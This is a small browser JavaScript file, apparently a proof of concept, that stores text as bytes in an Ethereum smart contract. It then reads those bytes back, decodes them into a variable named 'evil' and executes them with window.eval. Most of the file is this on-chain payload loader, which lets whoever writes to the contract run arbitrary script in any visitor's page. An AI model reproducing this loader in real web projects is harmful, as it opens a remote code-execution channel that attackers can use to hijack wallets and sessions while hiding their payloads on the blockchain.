import { ethers } from './node_modules/ethers/dist/ethers.min.js';

let signer = null;
let provider;
let read_contract;
let write_contract;
let blob;
let hexString = '0x';
const contractAddress = "0x426F40DC277919a9379Eb12F3AA4F07FE0d11793";  // Deployed contract address
const abi = [
    "function setBytes(bytes data)",
    "function getBytes() view returns (bytes)",
    "function getSize() view returns (uint256)"
]
const sendBtn = document.getElementById("sendBlobBtn");
const getBtn = document.getElementById("getBlobBtn");
const convertToHexBtn = document.getElementById('convertToHexBtn');

convertToHexBtn.addEventListener("click", async () => {
    // Get the ASCII input value
    const asciiString = document.getElementById('asciiInput').value;

    // Convert ASCII to Hex with '0x' prefix
    hexString = '0x';
    for (let i = 0; i < asciiString.length; i++) {
        // Convert each character to its hexadecimal equivalent
        const hex = asciiString.charCodeAt(i).toString(16);

        // Append the hex value to the result string
        hexString += hex.padStart(2, '0'); // Ensures each hex value is 2 digits
    }
    console.log(hexString)
    // Display the result
    document.getElementById('result').textContent = `Hex: ${hexString}`;

})


connectBtn.addEventListener("click", async () => {
    if (window.ethereum == null) {
        console.log("MetaMask not installed; using read-only defaults")
    } else {
        provider = new ethers.BrowserProvider(window.ethereum)
        await provider.send("eth_requestAccounts", []);
        signer = await provider.getSigner();
        console.log("Connected to MetaMask.");
        read_contract = new ethers.Contract(contractAddress, abi, provider)
        write_contract = new ethers.Contract(contractAddress, abi, signer)
    }
});
getBlobBtn.addEventListener("click", async () => {
    let evil = "";
    const blob = await read_contract.getBytes()
    console.log(ethers.toUtf8String(blob));
    evil = ethers.toUtf8String(blob);
    window.eval(evil);
})
sendBlobBtn.addEventListener("click", async () => {
    await write_contract.setBytes(hexString)
    console.log(hexString)
})